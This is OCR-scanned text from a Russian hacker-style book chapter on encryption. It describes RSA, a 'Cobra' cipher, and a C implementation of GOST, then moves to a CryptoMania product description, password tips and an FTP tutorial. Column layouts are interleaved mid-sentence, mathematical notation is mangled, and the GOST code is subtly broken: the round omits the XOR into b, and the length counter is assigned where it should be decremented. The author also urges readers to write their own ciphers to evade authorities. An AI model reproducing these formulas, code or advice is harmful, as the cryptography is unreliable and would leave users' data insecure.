Шифрование и безопасность
Шифрование и безопасность
Открытый ключ E предоставляется всем желающим зашиф
ровать сообщение, дешифровать которое можно только с помо
щью личного ключа D.
В 1978 году трое ученых из Массачусетского технологичес
кого института, Ривест, Шамир и Адлеман, предложили конкрет
ный метод шифрования с открытыми ключами, названный по их
инициалам RSA. Этот метод состоит в следующем:
1. берутся два простых числа p и q (обычно, более 10100);
2. вычисляются произведения s=p•q и t=(p 1)•(q 1);
3. выбирается не имеющее общих сомножителей с t число a;
твоему творению. Что делать? Да, нет, не сливать воду, и не сма
зывать лыжи, а шифровать(ся). Как? Вот об этом я тебе я расска
жу. Я не буду гнать пургу насчет DESа (DES умер и уже давно).
А вот несколько самых интересных и конкретных алгоритмов ши
фрования я тебе расскажу. Ну, поехали...
Что такое RSA?
Одним из признанных алгоритмов шифрования является
RSA. Модификации этого алгоритма весьма широко распростра
нены — даже всем известная PGP основана на этом алгоритме.
Суть этого алгоритма весьма проста:
1. Выбираются большие простые числа M и N;
4. находится b такое, что b•a=1 по модулю t.
Исходный текст, T, разбивается на блоки таким образом,
чтобы 0<T<s. Это можно сделать посредством группировки текс
та в блоки размером k бит, где k — наибольшее целое число, для
которого 2k < s.
Для кодирования сообщения необходимо вычислить C=Tb
по модулю s, а для декодирования T=Ca по модулю s. Таким об
разом, чтобы зашифровать сообщение, необходимо знать пару чи
сел (b, s), а чтобы дешифровать — пару чисел (a, s). Первая пара
— это открытый ключ, а вторая — личный.
Надежность этого метода опирается на трудность фактори
зации больших чисел. Ривест и его коллеги заявляют, что для фак
торизации 200 значного числа понадобится 4 миллиарда лет ра
боты компьютера с быстродействием 106 операций в секунду.
2. Вычисляется их произведение: Q=MxN;
3. Выбирается число D, которое должно быть взаимно про
стым с результатом умножения (M 1)x(N 1), т.е. не должно иметь
с ним общих делителей, отличных от единицы;
4. Вычисляется число A из выражения
(AxD) mod [(M 1)x(N 1)]=1;
Таким образом, пара чисел (A,Q) будет твоим открытым
ключом, а пара чисел (D,Q) — закрытым ключом. Понятно, что
открытым ключом можно только закодировать исходный текст,
для того, чтобы его раскодировать, нужен закрытый ключ.
Кодирование числа P: C=MA mod Q;
Обратная операция: P=CD mod Q;
Вот и все. Возникает только один вопрос: ломается ли RSA?
Если крутить что то достаточно долго, то ломается все! Тем более
зная внутреннее устройство...
Шифруемся
Ты и подрос в профессиональном плане, перестал исполь Так вот, для того, чтобы поломать RSA, необходимо и до
                                             зовать чужие кульные программы и решил написать свою. Моло статочно уметь разложить число Q (которое мы возьмем, понят
                                                                                              дец! Но я думаю, есть у тебя еще одна трабла — написать про но, из открытого ключа, помещенного человеком в бурные воды
                                                                                                                                            грамму ты написал, но вот твой IQ не смог спрятать твой IP и Internet) на простые множители. Вот тут то и начинается самое
                                                                                                                                                                                       твой E mail в лошадке, и теперь любой желающий, в том числе и интересное.
                                                                                                                                                                                                                                 люди в погонах, могут тебя вычислить, пройдясь отладчиком по 
E mail «безопасная» 140
139
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
Простые множители числа — летопись в теории чисел, над
ними бились многие математики, но увы, так ничего толком и не
добились. В математике не существует теорем, могущих надежно
предсказать, является ли число простым. Есть теоремы, которые
могут быстро установить, что число составное, но если условия
теоремы не выполняются, то это не значит, что число простое: это
значит, что оно ВРОДЕ БЫ простое, и надо применять более
сильные теоремы, которые, увы, на машине проверяются только
перебором. Далее, нет теорем, которые помогают хотя бы оценить
количество простых сомножителей числа и порядок их величины.
Так что реально число из, скажем, трехсот десятичных знаков раз
ложить на простые множители (если они, правда не лежат близ
ко к корню из числа и т.д. — есть легкие случаи) за разумное вре
мя нереально. Так, программа на 266 пне раскладывает число из
17 десятичных знаков за время, близкое к тридцати секундам, но
время ее работы есть P*exp(n), т.е. число из 300 знаков она будет
раскладывать в exp(280) раз дольше (это около 5*10279). Естествен
но, что если взять более быстрое точило, Cray, к примеру, то бу
дет побыстрее... Но все равно не слишком. Правда, есть более бы
стрые алгоритмы, решето Сива, например, но они хороши, когда
сомножители лежат близко к корню, и требуют дикое количество
памяти.
Сторожевая Кобра
Не пугайся, я не буду посылать тебя на птичий рынок за ко
брой и не буду давать рекомендаций как скрестить кобру и твою
лошадь.
Кобpа — это такой старенький программный комплекс для
установки на различные ПЭВМ типа IBM PC. Заключения экс
пертов: криптостойкость превосходит DES, алгоритм обладает хо
рошими криптографическими свойствами со стойкостью ~1022 от
носительно многих методов криптоанализа, трудоемкость
расшифровки составит 1012 операций, необходимый объем памя
ти для восстановления ключа — 1010 байт, для полноценного ана
лиза требуются работы трудоемкостью 100..120 чел./мес. и продол
E mail «безопасная»
141
жительностью 1.5 2 года. В общем один из наикрутейших профес
сиональных программных продуктов для заинтересованных лиц.
Но покупать ее мы, естественно, не собираемся. Нас интересует
алгоритм шифрования, заложенный в его внутренностях. Рассмо
трим его на примере зашифровывания 512 байт текста. Шифро
вание состоит из нескольких основных последовательных проце
дур, которые выполняются в определенном порядке при разных
начальных условиях (значения Uо, Yо, Co, K1).
Обозначения:
■ Ti и Ci — i тые пары символов исходного текста и
                                     шифра, представленные двухбайтовым числом;
■ Fm(Ui), Fc(Yi), Fс(Ui), Fm(Yi) — значения пар
                 ключевых элементов с номерами Ui и Yi, в
                                            подключах m и c;
■ K1 — константа, определяемая паролем;
■ Cl — младший байт двухбайтового числа,
                                  отображающего пару символов;
■ Ch — старший байт двухбайтового числа,
                                  отображающего пару символов.
Общий ключ длиной 384 байта разбит на два подключа дли
ной по 257 байт.
Алгоритм 1 ой процедуры (значения входных символов про
нумерованы в обратной последовательности).
1. Установить значение счетчика i=1 и задать начальные по
ложения указателей Uо, Yо и К1 как функцию f1 от пароля.
2. Осуществить преобразование i той пары исходных сим
волов:
C'i = (Ti — K1) XOR Fm(Ui 1 mod 256)
3. Вычислить новые значение указателей U и Y:
Ui = (Ui 1 mod 256) XOR Fc(Yi 1 mod 256)
Уi = (Уi 1 mod 256)+ Cl'i
142
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
Ci = C'i + Ui
5. Установить i=i+1. Если i<=256, то перейти к п.2, иначе
СТОП.
4. Закончить преобразование i той пары исходных Алгоритм 4 ой процедуры (значения входных символов
                                      символов: пронумерованы в прямой последовательности).
                                              Ci = C'i + Ui 
                                              5. Установить i=i+1. Если i<=256, то перейти к п.2, иначе 
                                                                            СТОП. 
Алгоритм 2 ой процедуры (значения входных символов 1. Установить значение счетчика i=1 и задать начальные
                                          пронумерованы в прямой последовательности). положения указателей Uо, Yо и Со как функцию f4 от пароля.
1. Установить значение счетчика i=1 и задать начальные 2. Осуществляется преобразование i той пары исходных
                                          положения указателей Uо, Yо как функцию f2 от пароля. символов:
                                                                                                                                              C'i = (Ti + C'i 1) XOR Fс(Ui 1 mod 256)
                                                                                                                                              3. Вычислить новые значение указателей U и Y:
                                                                                                                                                                              Yi = Yi 1 + Ch'i 1
                                                                                                                                                                             Ui = ((Ui 1 mod 256) XOR Fm(Yi mod 256)) + Cl'i 1
                                                                                                                                                                            4. Закончить преобразование i той пары исходных
                                                                                                                                                                                                                 символов:
                                                                                                                                                                                                                        Ci = C'i + Ui
                                                                                                                                                                                                                       5. Установить i=i+1. Если i<=256, то перейти к п.2, иначе
                                                                                                                                                                                                                                                    СТОП.
2. Осуществить преобразование i той пары исходных
символов:
C'i = Ti XOR Fс(Ui 1 mod 256)
3. Вычислить новые значения указателей U и Y:
Ui = (Ui 1 mod 256) XOR Fm(Yi 1 mod 256)
Уi = (Уi 1 mod 256)+ Ch'i
4. Закончить преобразование i той пары исходных
символов:
Ci = C'i + Ui
5. Установить i=i+1. Если i<=256, то перейти к п.2, иначе
СТОП.
Алгоритм 3 ей процедуры (значения входных символов
пронумерованы в обратной последовательности).
1. Установить значение счетчика i=1 и задать начальные
положения указателей Uо, Yо и Со как функцию f3 от пароля.
Порядок выполнения основных последовательных процедур
определяется на этапе аутентификации пользователя при форми
ровании конкретного механизма криптографических преобразо
ваний в зависимости от требуемой криптостойкости и может пре
дусматривать такие варианты:
■
■ 
143
две процедуры;
■ 
144
три процедуры;
■ 
2. Осуществляется преобразование i той пары исходных
символов:
C'i = (Ti + C'i 1) XOR Fm(Ui 1 mod 256)
3. Вычислить новые значение указателей U и Y:
Yi = Yi 1 + Cl'i 1
Ui = ((Ui 1 mod 256) XOR Fc(Yi mod 256)) + Ch'i 1
4. Закончить преобразование i той пары исходных
символов:
E mail «безопасная»
четыре процедуры;
две процедуры, первая неполная.
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
#include <stdio.h>
#include "gost.h"
#pragma hdrstop
// Внутренние типы
typedef BYTE PERM_TABLE[256];
// Внутренние переменные
static Inited = NO;
// Ключи
static DWORD X[32];
static PERM_TABLE K[4];
// Внутренние константы.
static int indexes[] =
{ 0, 1, 2, 3, 4, 5, 6, 7,
0, 1, 2, 3, 4, 5, 6, 7,
0, 1, 2, 3, 4, 5, 6, 7,
7, 6, 5, 4, 3, 2, 1, 0 };
void print_block( BYTE * addr, int len );
BOOL init( KEY key, SBOX sbox[8] )
{
int i, j, k;
if( Inited )
return( NO );
for( i = 0; i < NITEMS( X ); i++ )
X[i] = key[indexes[i]];
for( i = 0; i < 4; i++ )
for( j = 0; j < 16; j++ )
for( k = 0; k < 16; k++ )
K[i][ (j<<4) + k ] = ( sbox[i*2+1][j] << 4 ) +
sbox[i*2][k];
return( Inited = YES );
};
BOOL terminate( void )
{
int i, j;
if( !Inited )
Здесь:
■ цифpа обозначает номеp основной пpоцедуpы;
■ знаки « » и «+» напpавление обpаботки
                               последовательности символов;
■ индекс f — модификацию функции от паpоля для
                                       вычисления начальных значений и констант
                                                                          используемых в основных пpоцедуpах;
■ знак «*» означает, что этой процедурой
                                  обрабатывается только часть входной
                                                                 последовательности символов.
Естественно, что при использовании трех и тем более четы
рех процедур вариантов будет больше.
Наш родной советский GOST
Здесь приведена реализация ГОСТ, пусть не самая эффек
тивная, но содержащая несколько интересных, на мой взгляд,
идей. Константы C1 и C2 каждый желающий может посмотреть в
ГОСТе, здесь я их публиковать не буду. (Для тех, кто в танке:
ГОСТ — ГОсударственный СТандарт. Так вот, для алгоритмов
шифрования данных, тоже разработали стандарт, типа так и не
иначе, и алгоритм такого шифрования получил соответствующее
название ГОСТ).
Итак, непосредственная реализация на С++.
E mail «безопасная»
145
146
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
return( NO );
for( i = 0; i < NITEMS( X ); i++ )
X[i] = 0;
for( i = 0; i < 4; i++ )
for( j = 0; j < 256; j++ )
K[i][j] = 0;
Inited = NO;
return( YES );
};
void ghost_encrypt_sp( void ); // Эта функция должна
быть написа на АСМе, дабы усе быстро летало.
void encrypt_sp( KEY key, BLOCK data )
{
DWORD a, b, a_new;
int i, j;
union {
DWORD d;
BYTE b[4];
} tmp;
if( !Inited )
return;
a = data[0];
b = data[1];
for( j = 0; j < 32; j++ ) { // Цикл шифрования
tmp.d = a + X[j];
for( i = 0; i < NITEMS( tmp.b ); i++ )
tmp.b[i] = K[i][tmp.b[i]];
a_new = ( ((tmp.d&0x001FFFFFUL) << 11) +
((tmp.d&0xFFE00000UL)>>21) ) ;
b = a;
a = a_new;
};
data[0] = b;
data[1] = a;
};
E mail «безопасная»
void decrypt_sp( BLOCK data )
{
DWORD a, b, a_new;
int i, j;
union {
DWORD d;
BYTE b[4];
} tmp;
if( !Inited )
return;
a = data[0];
b = data[1];
for( j = 0; j < 32; j++ ) { // Цикл расшифровки
tmp.d = a + X[31 j]; // !!! Вот только этим и
отличается шифрация от дешифрации
for( i = 0; i < NITEMS( tmp.b ); i++ )
tmp.b[i] = K[i][tmp.b[i]];
a_new = ( ((tmp.d&0x001FFFFFUL) << 11) +
((tmp.d&0xFFE00000UL)>>21) );
b = a;
a = a_new;
};
data[0] = b;
data[1] = a;
};
#define Const_C1 0xXXXXXXXXUL
#define Const_C2 0xXXXXXXXXUL
void encrypt_g( BLOCK synchro, BYTE * data, UINT len )
{
BLOCK gamma;
ULONG lo, hi;
UINT chunk;
BYTE * p;
gamma[0] = synchro[0];
gamma[1] = synchro[1];
147
148
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
encrypt_sp( X, gamma );
lo = gamma[0];
hi = gamma[1];
while( len > 0 ) {
lo += Const_C2;
if( hi < (0xFFFFFFFFUL — Const_C1) )
hi += Const_C1;
else
hi += Const_C1 — 0xFFFFFFFFUL;
gamma[0] = lo;
gamma[1] = hi;
encrypt_sp( X, gamma );
chunk = ( len > 8 ) ? 8 : len;
len = chunk;
p = (BYTE *) gamma;
while( chunk
> 0 )
*data++ ^= *p++;
}
};
void encrypt_gfb( BLOCK synchro, BYTE * data, UINT len )
{
BLOCK gamma, * blk_data;
BYTE * p;
gamma[0] = synchro[0];
gamma[1] = synchro[1];
encrypt_sp( X, gamma );
while( len >= sizeof( BLOCK ) ) {
blk_data = (BLOCK *) data;
data += sizeof( BLOCK );
gamma[0] ^= (*blk_data)[0];
gamma[1] ^= (*blk_data)[1];
(*blk_data)[0] = gamma[0];
(*blk_data)[1] = gamma[1];
encrypt_sp( X, gamma );
len = sizeof( BLOCK );
E mail «безопасная»
149
}
p = (BYTE *) gamma;
while( len
> 0 )
*data++ ^= *p++;
};
void decrypt_gfb( BLOCK synchro, BYTE * data, UINT len
){
BLOCK newgamma, gamma, * blk_data;
BYTE * p;
gamma[0] = synchro[0];
gamma[1] = synchro[1];
encrypt_sp( X, gamma );
while( len >= sizeof( BLOCK ) ) {
blk_data = (BLOCK *) data;
data += sizeof( BLOCK );
newgamma[0] = (*blk_data)[0];
newgamma[1] = (*blk_data)[1];
(*blk_data)[0] ^= gamma[0];
(*blk_data)[1] ^= gamma[1];
gamma[0] = newgamma[0];
gamma[1] = newgamma[1];
encrypt_sp( X, gamma );
len = sizeof( BLOCK );
}
p = (BYTE *) gamma;
while( len
> 0 )
*data++ ^= *p++;
}
Вот так шифруются нормальные люди. Какой из этих трех
алгоритмов ты выберешь, это твое личное дело. Первый прост, но
относительно легко дешифруется при наличии нормального пня
и кучи свободного тайма. Второй сложнее реализовать, зато голо
вная боль спецслужбам обеспечена не на одну сотню лет, ну а тре
тий — только от тупых юзверей и можно зашифроваться. Все за
висит от того, куда и что ты внедряешь или пересылаешь. И
150
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
последнее: почему лучше написать свой шифровщик а не восполь
зоваться готовой прогой? Потому что у тебя нет гарантии, что в
какой то супер пупер программе нет черной дырки, оставленной
ее разработчиком.Так что шифруемся, господа и спим спокойно,
потом опять шифруемся и опять спим, потом опять и опять... Не
забудь только поставить условие выхода из цикла.
Программа CryptoMania — одно из
надежных средств защиты информации
На жестких дисках наших персоналок, как правило, хранит
ся много конфиденциальной информации — договоры и счета,
сведения о компаньонах и конкурентах, личные письма и адреса.
Доступ посторонних лиц к этой информации всегда, мягко го
воря, нежелателен.
У нас в России почему то считается, что надежнее всего во
обще не хранить такую информацию на компьютере. Наиболее
ценное переписывается на дискеты и носится с собой или хранит
ся в сейфе под замком. Некоторые идут еще дальше и просто ре
гулярно снимают с компьютера жесткий диск. Все признают, что
это неудобно, сложно, противоречит самому духу компьютерной
обработки информации, но кажущаяся надежность перевешивает
прочие резоны. При этом обычно забывают, что злоумышленни
ки могут просто «попросить» показать им хранимые в кейсе или
сейфе носители информации. И просьба прозвучит настолько
«аргументированно», что отказать будет трудно. Постоянно пере
мещаемые дискеты владелец может потерять, да и выкрасть их не
представляет особого труда.
желающих вызывает сомнение: ведь никто не установит в кварти
ре замок, найденный вместе с ключами на улице. И, конечно,
нельзя забывать о сыре, который бывает бесплатным только в мы
шеловке.
К счастью, существует несколько вполне надежных разра
боток специализированных отечественных фирм, давно и успеш
но работающих в области защиты информации. Одна из них —
программа CryptoMania, созданная в ОАО «ИнфоТеКС».
CryptoMania предназначена для защиты от несанкциониро
ванного доступа к файлам и каталогам любого формата (кроме си
стемных) на жестких дисках, дискетах и других носителях инфор
мации. Она позволяет, во первых, закрыть доступ к
конфиденциальным материалам, хранимым на жестких дисках
компьютеров. Во вторых, с ее помощью можно разграничить до
ступ нескольких пользователей к информации, хранимой на од
ном компьютере. В третьих, CryptoMania способна защитить ин
формацию на переносных и карманных компьютерах, дискетах и
иных накопителях. И, наконец, закрытые с помощью программы
конфиденциальные материалы можно пересылать как по обычной
открытой почте, так и по электронной, не опасаясь, что они бу
дут прочитаны.
Секрет ее стойкости
— Как! — закричал Буратино радостно. — Ты знаешь
тайну золотого ключика?
— Знаю, где ключик лежит, как его достать,
знаю, что им нужно открыть одну дверцу...
А.Толстой. «Золотой ключик»
Для защиты файлов непосредственно на дисках можно ис Высокая стойкость к попыткам взлома в программе Crypto
                                             пользовать одну из многочисленных программ, свободно распро Mania достигается за счет особой конструкции механизма закры
                                                                                                 страняемых в сети Internet. Однако надежность защиты таких про тия файлов. Параметры этого механизма находятся в сложной за
                                                                                                                                              грамм определить практически невозможно. Закрытая с их висимости как от номера лицензии, выдаваемой пользователю,
                                                                                                                                                                                             помощью информация зачастую может быть вскрыта специалис так и от вводимого пароля. Поскольку номер лицензии уникален
                                                                                                                                                                                                                                               том средней квалификации. Да и доступность программ для всех и генерируется специальной программой, а пароль известен лишь
                                                                                                                                                                                                                                                                                                                                                                                                                   пользователю, защищенные файлы оказываются недоступными
E mail «безопасная» 152
151
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
даже для тех, кто программу CryptoMania разработал. Механизм
настолько сложен, что перебор всех его возможных комбинаций
на современных ЭВМ требует не одного десятка лет.
Пароль выполняет еще одну роль. Он позволяет организо
вать разграничение доступа к файлам нескольких сотрудников
фирмы или членов семьи, использующих один компьютер. Каж
дый из пользователей может защищать свои файлы личным паро
лем, а несколько пользователей, объединенных общими интере
сами, — еще и общими паролями. Но не стоит неограниченно
расширять круг лиц, пользующихся программой с одним и тем же
номером лицензии. Ведь в этом случае они используют одинако
вый механизм защиты, стойкость которой определяется лишь
удачным выбором пароля.
Поэтому пользователям CryptoMania не стоит передавать
программу для копирования даже друзьям и знакомым — ведь при
этом передается и часть защитного механизма. Окольным путем
программа может попасть к лицам, которые попытаются получить
доступ к информации законного пользователя. Поскольку имя по
следнего фиксируется в каждой лицензионной копии, сделать это
будет нетрудно.
Программа CryptoMania может использоваться и для защи
ты пересылаемой или перевозимой информации. В этом случае
программа с одним и тем же лицензионным номером устанавли
вается на двух или нескольких компьютерах, находящихся в раз
ных офисах, в том числе в разных городах. Информация, закры
тая на одном из компьютеров и записанная на дискеты, может
быть раскрыта на другом, если в этот офис предварительно сооб
щен пароль. При утере или хищении пересылаемых по открытой
почте дискет (перехвате сообщений, пересылаемых по элек
тронной почте) файлы останутся недоступными для посторонних
лиц и будут восприниматься ими как испорченные. Наивысшая
степень защиты информации достигается в том случае, когда про
грамма вообще не устанавливается на жестком диске, а запуска
ется с дискеты или CD. Тот же эффект достигается, если уже ин
E mail «безопасная»
153
сталлированная программа стирается при угрозе прочтения фай
лов нежелательными лицами. Злоумышленник, получивший до
ступ к компьютеру, не найдет на нем программы защиты, а по
пытавшись открыть защищенные файлы в любой кодировке,
обнаружит в них полную абракадабру.
Для запуска программы требуется компьютер IBM PC 486 и
выше с OC Windows 95/98/NT и свободным местом на жестком
диске не менее 2 Мбайт.
Адреса, явки, пароли...
— У вас продается славянский шкаф?
— Шкаф продан. Есть никелированная кровать.
— С тумбочкой?
Из кинофильма «Подвиг разведчика»
Пароли — наиболее уязвимая часть любой системы защиты
информации. Как бы ни была «крепка броня», создаваемая про
граммой CryptoMania, она не устоит перед злоумышленником,
получившим доступ к программному обеспечению и паролю за
конного пользователя. Мы уже говорили, что программу Crypto
Mania, как и любое другое программное средство защиты инфор
мации, ни в коем случае нельзя передавать для копирования даже
самым надежным друзьям. А по поводу паролей можно дать не
сколько общих рекомендаций.
Регулярно меняйте пароли. Даже если злоумышленник слу
чайно узнает или подберет ваш пароль, он не сможет долго им
пользоваться и, в конце концов, потеряет доступ к вашей инфор
мации. Не используйте придуманные посторонними пароли, да
же если они кажутся вам очень оригинальными. Ни в коем слу
чае не применяйте в качестве паролей ассоциированную с вами
информацию, то есть производные от своего имени, отчества или
фамилии, имени супруги (супруга) или детей, даты своего и их
рождения, номера телефона или автомобиля, домашнего адреса и
т.п. И все таки выбирайте достаточно простые и легко запомина
154
E mail «безопасная»
Шифрование и безопасность
File Transfer Protocol
ющиеся пароли. Ведь их ни в коем случае нельзя записывать на
бумаге.
В этом и кроется противоречие, делающее выбор пароля
совсем непростой задачей. Выработка собственной парольной по
литики открывает большой простор для фантазии. И эта полити
ка может оказаться наилучшей хотя бы потому, что о ней знаете
только вы сами. Один из примеров выбора пароля приведен ни
же.
Используйте фразу из 3 4 слов, содержащую сведения о хо
рошо знакомом лично вам событии. Желательно, чтобы об этом
событии не знали окружающие, а фраза содержала имена собст
венные. Например, вряд ли кому то из ваших нынешних коллег
известно, что ваш школьный друг Олег любил переплывать Вол
гу. Возьмите из каждого слова, набранного курсивом, 2, 3 или 4
буквы. Если вы возьмете четыре буквы, то получите: «Олеглюби
переВолг». Теперь можно перейти на английский шрифт клавиа
туры, нажать клавишу «Caps Lock» и набрать полученный текст
русскими буквами. Вы получите: «jKTUK><BGTHTdJKU».
Согласитесь, что такой пароль выглядит беспорядочным на
бором символов, который практически невозможно запомнить
обычным способом, но легко воспроизвести лично вам. Впрочем,
изменение шрифта и замена строчных букв на заглавные, и на
оборот — не очень оригинальная идея. Более принципиально то,
что при вводе четырех букв от каждого из четырех слов задуман
ной вами фразы, вероятность угадать пароль простым перебором
вариантов становится меньше 10 12%.
File Transfer Protocol
Один из способов передачи информации
Мы не откроем ничего нового, утверждая, что Internet — это
всемирная сеть, заключающая в себе огромные информационные
ресурсы. Для человека информативными являются звуки, изобра
жения, ощущения, запахи и так далее, компьютеры же привыч
ные человеку образы могут получать, хранить и передавать толь
ко в виде последовательности байтов (файлов). И если обмен
информацией между компьютерами на самом деле — это обмен
файлами, то для человека получить по сети какой либо образ —
значит скопировать на свой компьютер соответствующий файл.
Тем, кто хочет использовать Internet как можно продуктивнее, не
обходимо уметь искать и копировать нужные файлы.
В Internet есть много способов передачи информации c уда
ленного компьютера на локальный. Цель данного документа —
ознакомить и научить одному из них, использующему FTP — File
Transfer Protocol. Этот протокол делает доступным большую часть
программного фонда Internet.
Главное назначение FTP — это пересылать (копировать, пе
редавать) файлы. FTP можно использовать самостоятельно, а так
же через другие системы, например, WWW имеет FTP как часть
своего протокола.
FTP серверы разбросаны по всему миру, но для соединения
с ними не требуется знания их физического расположения. В
Internet к компьютеру обращаются по адресу. Например, FTP сер
вер фирмы Borland имеет адрес ftp.borland.com
Итак, предположим, что Вам известен адрес нужного FTP
сервера. Теперь неплохо было бы соединиться с ним. Это делает
ся с помощью специальной программы, которая называется FTP
E mail «безопасная»
155
156
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
клиент. Раньше, когда выход в Internet имели только UNIX ком
пьютеры, все FTP клиенты были одинаковы: командная строчка
со стандартным набором команд и все. Сейчас же, во времена
оконных систем, появилось много программ, при использовании
которых не требуется запоминать синтаксис команд, а файлы про
сто напросто перетаскиваются мышкой. Однако и в их основе ле
жит стандартная система команд FTP. На каждое действие мы
шью FTP клиент генерирует последовательность FTP команд.
Переписываем файлы
Итак, вы загрузили FTP клиент. Для того, чтобы начать се
анс обмена с сервером, необходимо сначала открыть соединение.
Для этого существует команда:
open имя_сервера
Слово open можно сократить до одной буквы o. Итак, по
пробуем:
ftp> o ftp.borland.com
Подождите несколько секунд пока компьютеры совершат
соединение.
Теперь надо зарегистрироваться. Увидев приглашение login:,
наберите слово anonymous. Нажмите Enter и введите свое имя, за
тем символ @ (без пробелов) и адрес вашей локальной машины.
Если все сделано правильно, то появится сообщение о том, что
вы вошли в систему.
Теперь вы можете копировать себе те файлы, доступ к ко
торым Вам определен как анонимному пользователю. Советуем
начать исследование сервера с каталога /pub, так как обычно все
полезные файлы помещаются именно сюда. Сейчас же вы нахо
дитесь в самом верхнем, так называемом root каталоге. Для того,
чтобы перейти в нужный каталог существует команда cd.
Например, в каталог pub текущего каталога можно перейти:
ftp> cd pub
E mail «безопасная»
157
Получить список файлов в текущем каталоге можно коман
дой dir:
ftp> dir
Если в появившемся списке первым символом в строке яв
ляется «d», то в строке имя каталога, если « » — имя файла.
Предположим, что вы нашли файл, который хотите перепи
сать себе. Прежде, чем сделать это, надо установить двоичный ре
жим передачи файлов binary:
ftp> binary
Возьмите себе за правило: как только соединитесь с серве
ром, сразу вводить эту команду. Если этого не сделать, то файл
будет перекодирован и непригоден для использования (если толь
ко это не текст на английском языке). При появлении во время
копирования файла сообщения:
'Opening ASCII mode to transfer file'
немедленно прервите передачу файла и запустите binary. Многие
современные FTP клиенты автоматически посылают эту команду.
Выполняет ли это программа, с которой работаете вы, придется
исследовать самостоятельно.
Пересылает файл на локальный компьютер команда get:
ftp> get the_file_i_like.zip
Если вы сразу захотите положить файл в определенное ме
сто на локальном компьютере, то укажите путь как второй аргу
мент команды:
ftp> get the_file_i_like.zip /usr/skyer/my_new_file.zip
По умолчанию FTP клиент кладет файл в текущую дирек
торию на локальном диске.
Для FTP клиента под Windows этой директорией будет ка
талог Windows. Для UNIX систем это будет тот каталог, откуда вы
запустили клиента. (Не забудьте перед загрузкой клиента прове
рить, достаточно ли у вас прав для записи в этот каталог. В про
тивном случае вам придется явно указывать путь в каждой коман
де get).
158
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
■ 
Для их пересылки можно использовать команду mget, кото
рая понимает шаблоны групповых операций. В некоторых реали
зациях FTP клиентов шаблоны групповых операций можно ис
пользовать и в команде get.
Теперь, когда файл копируется, можно отдохнуть. Время
ожидания зависит от размера файла и возможностей вашего под
ключения к Internet. Узнайте это заранее. Если скорость подклю
чения около 300 байт в секунду, а размер файла — десятки мега
байт, то... Вам лучше поискать другой способ достать этот файл.
войдите в требуемую директорию одной или
                                  несколькими командами cd имя_директории;
■ 
Зачастую требуемая информация расположена не в одном,
а в нескольких файлах.
установите двоичный тип пересылки файла: binary;
■ 
Можно переписать содержимое сразу всего каталога, для
этого надо указать его имя в команде get.
дайте команду get имя_файла.
Шаблоны групповых операций
При большом количестве файлов перебор их имен — уто
мительная задача. Порой трудно перечислить 5 6 файлов, а если
их сотня?
Выход есть. Существует система шаблонов, которую лучше
всего изучать на примерах. Перед этим объяснение специальных
знаков:
Когда пересылка файлов будет закончена, FTP клиент со
общит вам об этом. Теперь можно выходить из FTP клиента (при
выходе он автоматически закроет соединение с сервером) и поль
зоваться этими файлами, так сказать, в домашних условиях.
■ Символ «*» обозначает любой набор символов.
■ Символ «?» обозначает один любой символ.
Примеры:
■ abc? — все файлы, имеющие длину имени в четыре
                                     символа, начинающиеся на «abc» и заканчивающиеся
                                                                           на любой символ;
■ 
Для того, чтобы скопировать файл с FTP сервера нужно:
abc* — все файлы, начинающиеся на «abc»;
■ 
Последовательность действий
??abc? — файлы с именем в шесть символов, 3, 4, 5
                           символы «abc» и остальные любые;
■ открыть соединение с этим сервером ■ зарегистрироваться ■ установить требуемый тип пересылки ■ перейти в нужный каталог ■ *abc — все файлы, оканчивающиеся на «abc»;
указать файл для передачи на локальный компьютер. ■ * — все файлы.
■
Учтите, что большие и маленькие буквы различаются.
Для реализации этих шагов:
■ войдите в программу клиент FTP; ■ дайте команду open имя_сервера; Каталоги
■ введите имя анонимного пользователя anonymous Для того, чтобы ориентироваться в море программ, доступ
                                    после приглашения ных в Internet, необходимо иметь представление о расположении
                                                    password: мое_имя@имя_моего_домена; файлов на компьютере. Скорее всего, вы уже знаете, что файлы
E mail «безопасная»
159
160
E mail «безопасная»
File Transfer Protocol
File Transfer Protocol
распределены по каталогам, которые также называются директо дой dir и перейти в требуемый подкаталог командой cd, не думая
                                                    риями или папками. ни о каких правилах составления путей при помощи слэшей.
В определенный момент пользователь находится только в На этапе исследования сервера вы, очевидно, будете захо
                                               одном каталоге, который называется текущим. По команде get дить во все каталоги и просматривать их содержимое. Поэтому
                                                                                             имя_файла, компьютер ищет файл в текущем каталоге. Для нави удобно знать команду перехода в предыдущий каталог:
                                                                                                                                             гации по серверу вам надо знать имя текущего каталога и спосо cd ..
                                                                                                                                                                                                бы передвижения по ним. «..» — это псевдоним родительского каталога. Вы можете ис
                                                                                                                                                                                                                                                                                         пользовать его в формировании путей.
Так как традиционной операционной системой для много
пользовательских систем является UNIX, то везде вам придется
использовать имена каталогов в стиле UNIX.
cd ../newsoft переход в newsoft, который находится в роди
тельском каталоге.
Общий вид пути в файлу выглядит так:
/имя_каталога/имя_подкаталога/имя_файла
где имя_подкаталога может повторяться сколь угодно раз или его
может не быть вовсе. Наверное, вы уже заметили, что имена ка
талогов разделяются знаком «/». Пользователям MS DOS придет
ся привыкнуть: используется не обратный слэш («\»), а прямой.
Учтите, что маленькие и большие буквы различаются.
Вот графическое изображение структуры каталогов:
Слэш в самом начале пути означает, что отсчет начинается
с самого верхнего — root каталога. Если слэша в начале нет, то
компьютер интерпретирует путь, начиная от текущего каталога,
как бы склеивая имя текущего каталога с указанным.
Например:
Текущий каталог: /pub/3d
Вы указываете каталог: programming/cpp
Результат: /pub/3d/programming/cpp
Такой сокращенной записью пути (начиная от текущего ка
талога) пользуются очень часто. Конечно удобнее указать каталог,
который находится в текущем каталоге, чем писать весь путь.
Переход между каталогами производится с помощью коман
ды cd — Change Directory. Ее синтаксис:
cd имя_директории
Наиболее часто применяемый способ навигации в каталогах
— узнать список файлов и каталогов в текущем каталоге коман
E mail «безопасная»
161
Хотя в Internet все еще встречаются системы, которые по
сылают списки файлов в своем формате (например: MS DOS,
Mac OS), однако не стоит беспокоиться: форматы вполне понят
